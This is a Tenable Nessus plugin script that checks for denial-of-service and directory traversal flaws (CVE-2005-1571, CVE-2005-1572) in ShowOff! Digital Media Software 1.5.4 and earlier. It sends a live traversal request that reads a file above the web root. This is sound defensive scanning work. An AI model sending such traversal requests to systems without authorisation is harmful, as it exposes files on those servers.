#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18249);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-1571", "CVE-2005-1572");
  script_bugtraq_id(13598);
  script_xref(name:"OSVDB", value:"16332");
  script_xref(name:"OSVDB", value:"16333");
  script_xref(name:"Secunia", value:"15300");

  script_name(english:"ShowOff! Digital Media Software <= 1.5.4 Multiple Remote Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple issues." );
 script_set_attribute(attribute:"description", value:
"The version of ShowOff! Digital Media Software installed on the remote
host suffers from multiple vulnerabilities:

  - A Denial of Service Vulnerability
    If Picture Submissions has been enabled (it is off by
    default), an attacker can cause the software to stop
    listening for requests by sending a malformed request
    to the upload port for picture submissions (port 8083
    by default).

  - Multiple Directory Traversal Vulnerabilities
    An attacker can retrieve files outside the configured
    web document root, potentially resulting in the 
    disclosure of sensitive information." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );
script_end_attributes();

 
  script_summary(english:"Checks for multiple remote vulnerabilities in ShowOff! Digital Media Software <= 1.5.4");
  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


# Make sure the server's banner indicates it's from ShowOff!
port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
banner = get_http_banner(port:port);
if (!banner || banner !~ "^Server: ShowOff!") exit(0);


# Try to exploit the directory traversal vulnerability.
#
# nb: this exploit requests the file 'ShowOffServer.url' that resides 
#     above the htdocs directory.
req = http_get(item:"/ShowGraphic?/../ShowOffServer.url", port:port);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# There's a problem if it looks like the file should.
if (res =~ "^[InternetShortcut]") security_hole(port);
